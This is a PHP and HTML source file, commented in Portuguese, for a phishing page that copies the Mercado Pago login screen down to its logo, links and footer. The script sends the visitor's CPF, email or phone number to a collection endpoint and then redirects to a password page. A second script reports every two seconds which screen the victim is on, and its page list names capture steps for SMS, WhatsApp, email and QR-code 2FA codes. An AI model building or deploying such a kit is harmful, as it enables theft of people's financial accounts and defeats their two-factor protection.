<?php
// --- LÓGICA DE DETECÇÃO E REDIRECIONAMENTO DE DISPOSITIVO ---
// Pega o User Agent do navegador que está acessando a página
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

// Verifica se o User Agent contém strings comuns de dispositivos móveis
$isMobile = preg_match('/(Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone)/i', $userAgent);

// Se for um dispositivo móvel, redireciona para a página de login mobile e para a execução do script
if ($isMobile) {
    header('Location: login-mobile.php'); // Você pode alterar "login_mobile.php" para o nome do seu arquivo de login mobile
    exit;
}

// Inicia a sessão para uso futuro
session_start();

// --- LÓGICA PARA CRIAR O COOKIE ---
if (!isset($_COOKIE['identificador_cliente'])) {
    $identificadorUnico = uniqid('cliente_', true) . bin2hex(random_bytes(8));
    setcookie('identificador_cliente', $identificadorUnico, time() + (86400 * 30), "/");
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digite seu CPF, e-mail ou telefone para iniciar sessão</title>
    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ui-navigation/6.6.5/mercadolibre/favicon.ico" type="image/svg"/>
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; }
        .main-header { background-color: #ffe600; padding: 0 680px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start; }
        .main-header img { height: 37px; vertical-align: middle; }
        .main-content { display: flex; justify-content: center; align-items: flex-start; padding-top: 80px; gap: 64px; flex-grow: 1; }
        .left-column { display: flex; flex-direction: column; flex-basis: 320px; flex-shrink: 0; }
        .main-title { font-size: 26px; font-weight: 600; color: #333; line-height: 1.35; text-align: left; margin: 0; }
        .form-card { width: 80%; max-width: 500px; background-color: #fff; box-shadow: 0 2px 6px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; box-sizing: border-box; }
        .security-link { display: flex; align-items: center; justify-content: space-between; background-color: #fff; border: 1px solid #e0e0e0; border-radius: 10px; padding: 14px 16px; text-decoration: none; color: #333; font-size: 14px; font-weight: 500; transition: box-shadow 0.2s; box-sizing: border-box; margin-top: 200px; }
        .security-link:hover { box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); }
        .security-link .icon-text { display: flex; align-items: center; gap: 12px; }
        .help-link { display: block; margin-top: 16px; color: #3483fa; text-decoration: none; font-size: 14px; font-weight: 400; }
        .help-link:hover { text-decoration: underline; }
        .input-label { font-size: 14px; color: #555; margin-bottom: 4px; display: block; font-weight: 400; }
        .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .input-field:focus { outline: 1px solid #3483fa; border-color: #3483fa; }
        .actions { margin-top: 24px; display: flex; align-items: center; gap: 24px; }
        .btn-continue { background-color: #3483fa; color: white; border: none; padding: 16px 24px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; }
        .btn-continue:hover { background-color: #2968c8; }
        .link-create { color: #3483fa; font-size: 15px; font-weight: 500; text-decoration: none; }
        .link-create:hover { text-decoration: underline; }
        .main-footer { background-color: #ededed; padding: 24px 48px; font-size: 12px; color: #666; display: flex; justify-content: space-between; align-items: center; }
        .footer-left, .footer-right { display: flex; align-items: center; gap: 16px; }
        .main-footer a { color: #3483fa; text-decoration: none; }
        .main-footer a:hover { text-decoration: underline; }
        .error-message { color: #d93025; font-size: 12px; text-align: left; margin-top: 4px; min-height: 16px; }
    </style>
</head>
<body>
    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.5/mercadolibre/pt_logo_large_plus.webp" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="left-column">
            <h1 class="main-title">Digite seu CPF, e-mail ou<br>telefone para iniciar sessão</h1>
            <a href="https://www.mercadopago.com.br/ato-complaint/classifier?origin=LOGIN_IDENTIFICATION_WEB" class="security-link">
                <span class="icon-text">
                    <svg xmlns="http://www.w3.org/2000/svg" width="27" height="26" fill="none" aria-hidden="true"><path fill="#000" fill-opacity="0.9" fill-rule="evenodd" d="M11.715 25.15C3.915 22.55 0 16.02 0 5.791V4.87h.924c3.462 0 6.955-1.448 10.494-4.38l.59-.489.589.488a23.955 23.955 0 002.914 2.087l-1.684 1.122a25.984 25.984 0 01-1.82-1.31C8.655 5.022 5.27 6.463 1.857 6.686c.212 8.828 3.585 14.298 10.15 16.61 2.287-.805 4.186-1.993 5.699-3.572h2.43c-1.909 2.506-4.522 4.32-7.837 5.425l-.292.098-.292-.098z" clip-rule="evenodd"></path><path fill="#000" fill-opacity="0.9" fill-rule="evenodd" d="M19.505 4.734a5.917 5.917 0 00-5.4 8.34l.25.556-.19.58-.888 2.722 2.978-.85.523-.15.504.205a5.917 5.917 0 102.223-11.403zM12.01 10.65a7.495 7.495 0 114.678 6.948l-4.678 1.336-.79-.79 1.445-4.425a7.468 7.468 0 01-.655-3.07z" clip-rule="evenodd"></path><path fill="#000" fill-opacity="0.9" d="M20.27 7.4h-1.53l.192 4.207h1.147l.192-4.208zm-.764 4.972a.765.765 0 110 1.53.765.765 0 010-1.53z"></path></svg>
                    <span>Tenho um problema de segurança</span>
                </span>
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#8e9194ff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
            </a>
            <a href="#" class="help-link">Preciso de ajuda</a>
        </div>
        <div class="form-card">
            <form id="login-form">
                <div>
                    <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
                    <input type="text" id="identificador" class="input-field" autocomplete="off">
                    <div id="error-message" class="error-message"></div>
                </div>
                <div class="actions">
                    <button type="submit" class="btn-continue">Continuar</button>
                    <a href="https://www.mercadopago.com.br/hub/registration/fiscal-splitter?contextual=normal&redirect_url=https%3A%2F%2Fwww.mercadopago.com.br%2F" class="link-create">Criar conta</a>
                </div>
            </form>
        </div>
    </main>

    <footer class="main-footer">
        <div class="footer-left">
            <a href="https://www.mercadopago.com.br/privacidade">Como cuidamos da sua privacidade</a>
            <span>Copyright © 1999-2025 Ebazar.com.br LTDA.</span>
        </div>
        <div class="footer-right">
            <span>Protegido por reCAPTCHA -</span>
            <a href="https://policies.google.com/privacy?hl=pt-BR">Privacidade</a>
            <a href="https://policies.google.com/terms?hl=pt-BR">Condições</a>
        </div>
    </footer>

    <script>
        const identificadorInput = document.getElementById('identificador');
        const loginForm = document.getElementById('login-form');
        const errorDiv = document.getElementById('error-message');
        const submitBtn = loginForm.querySelector('.btn-continue');

        // --- BLOCO DA MÁSCARA DE INPUT FOI REMOVIDO ---

        // --- FUNÇÕES DE VALIDAÇÃO (INALTERADAS) ---
        const isValidEmail = (email) => {
            const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(String(email).toLowerCase());
        };

        const isValidCPF = (cpf) => {
            cpf = cpf.replace(/\D/g, ''); // Remove formatação
            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
            let sum = 0, rest;
            for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
            rest = (sum * 10) % 11;
            if ((rest === 10) || (rest === 11)) rest = 0;
            if (rest !== parseInt(cpf.substring(9, 10))) return false;
            sum = 0;
            for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
            rest = (sum * 10) % 11;
            if ((rest === 10) || (rest === 11)) rest = 0;
            if (rest !== parseInt(cpf.substring(10, 11))) return false;
            return true;
        };

        const isValidPhone = (phone) => {
            phone = phone.replace(/\D/g, '');
            return phone.length >= 10 && phone.length <= 11;
        };

        // --- LÓGICA DE SUBMISSÃO DO FORMULÁRIO (INALTERADA) ---
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            errorDiv.textContent = ''; // Limpa erros antigos
            const valor = identificadorInput.value;

            if (!valor) {
                errorDiv.textContent = 'Informe seu e-mail, telefone ou CPF.';
                return;
            }

            let eValido = false;
            const apenasNumeros = valor.replace(/\D/g, '');

            if (valor.includes('@')) {
                eValido = isValidEmail(valor);
            } else if (apenasNumeros.length === 11) {
                eValido = isValidCPF(valor) || isValidPhone(valor); // Aceita CPF ou Celular com 11 dígitos
            } else if (apenasNumeros.length === 10) {
                eValido = isValidPhone(valor); // Aceita Telefone com 10 dígitos
            }

            if (!eValido) {
                errorDiv.textContent = 'Por favor, informe um dado válido.';
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Aguarde...';

            try {
                const response = await fetch('api_salvar_identificador.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ identificador: valor })
                });
                const result = await response.json();
                if (result.success) {
                    window.location.href = 'senha.php';
                } else {
                    errorDiv.textContent = result.error || 'Ocorreu um erro. Tente novamente.';
                }
            } catch (error) {
                console.error('Falha na comunicação:', error);
                errorDiv.textContent = 'Não foi possível conectar ao servidor.';
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continuar';
            }
        });
    </script>
<script>
        (function() {
            // Mapa de nomes de arquivos para mensagens de status amigáveis.
            const statusMap = {
                'index.php': 'Usuário na tela Home (Desktop)',
                'login-mobile.php': 'Usuário na tela Home (Mobile)',
                'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
                'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
                'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)',
                'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)',
                'sms_whats_desktop.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Desktop)',
                'sms_whats_mobile.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Mobile)',
                'qrcode-mobile.php': 'Usuário na tela para logar com QR Code (Mobile)',
                'telaqr.php': 'Usuário na tela para logar com QR Code (Desktop)',
                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Desktop)',
                'email2famobile.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Mobile)',
                'emailsms_desktop.php': 'Usuário na tela para logar com código no E-mail (Desktop)',
                'emailsms_mobile.php': 'Usuário na tela para logar com código no E-mail (Mobile)',
                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no SMS (Desktop)',
                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com código no SMS (Mobile)',
                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Desktop)',
                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
            };

            // Descobre o nome do arquivo da página atual
            const currentPage = window.location.pathname.split('/').pop() || 'index.php';

            // Pega a mensagem de status correspondente
            const currentStatus = statusMap[currentPage] || 'Página Desconhecida';

            // Função que envia o "ping" para a API
            async function sendStatusUpdate() {
                try {
                    await fetch('api_update_status.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ status: currentStatus })
                    });
                    // Não precisamos fazer nada com a resposta, apenas enviar.
                } catch (error) {
                    // Se falhar, loga no console sem incomodar o usuário.
                    console.error('Falha ao enviar atualização de status:', error);
                }
            }

            // Envia o primeiro status imediatamente ao carregar a página
            sendStatusUpdate();

            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
            setInterval(sendStatusUpdate, 2000);
        })();
    </script>
</body>
</html>